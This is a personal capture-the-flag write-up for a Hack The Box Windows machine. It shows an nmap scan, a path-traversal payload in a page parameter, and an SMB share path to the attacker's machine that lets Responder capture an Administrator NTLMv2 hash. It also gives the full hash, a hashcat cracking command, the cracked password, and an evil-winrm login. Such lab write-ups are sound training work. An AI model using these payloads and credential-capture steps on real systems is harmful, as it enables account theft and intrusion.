
`sudo nmap -vvv -Pn -sC -sCV --reason -T4 -p0-65535 10.129.9.229`

```
PORT     STATE SERVICE    REASON          VERSION
5985/tcp open  http       syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  pando-pub? syn-ack ttl 127
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```


An HTTP server is running, upon investigating in the browser we see the server redirects us too `unika.htb` This server has the option to change a language `and also send emails?`

The URL parameter used to load different languages is ?page= . Entering in a Directory traversial attack we see the parameter is vulnerable ../../../../../../../../windows/system32/drivers/etc/hosts loads the file

We open a responder Instance on Tunnel 0. The tunnel connected to HTB. `sudo responder -I tun0`

Since this parameter is vulnerable to Directory traversial we try something more complex than simple local files. We try to access a file on our own machine. `http://unika.htb/index.php?page=//10.10.14.87/SharedFile` This is a Remote File Vulnerability

Responder picks up onm this request and we get a hash for Administrator.

https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html

```
NTLMv2-SSP Client   : 10.129.9.229
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:f4f56913315d7267:620AC6E94EB0E1B2978D2D8518E20A73:010100000000000080D43FB4DF71DC011666DE00999A19C000000000020008005A004D004F00480001001E00570049004E002D003900390058004C005800560046004D0052003500490004003400570049004E002D003900390058004C005800560046004D005200350049002E005A004D004F0048002E004C004F00430041004C00030014005A004D004F0048002E004C004F00430041004C00050014005A004D004F0048002E004C004F00430041004C000700080080D43FB4DF71DC0106000400020000000800300030000000000000000100000000200000AC1B57AC795CD1E51F5C30FEE0233F11ECB9E746B9C95362D7FA67D48C3E86680A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380037000000000000000000

```

This hashcat command solved our hash ` hashcat -m 5600 Admin-NTLMv2  /usr/share/wordlists/rockyou.txt `

We then installed winrm and connected to the server using this command `evil-winrm -i 10.129.9.229 -p 5985 -u Administrator -p badminton`

We then found the flag file in the mike user desktop. which we concatenated in our terminal using the `type` command 

What I learned: How to set up a responder listener. Remote file vulnerabilities. Using hash cat to break a NTLMv2-SSP Hash. all i had to do was echo the whole thing into the file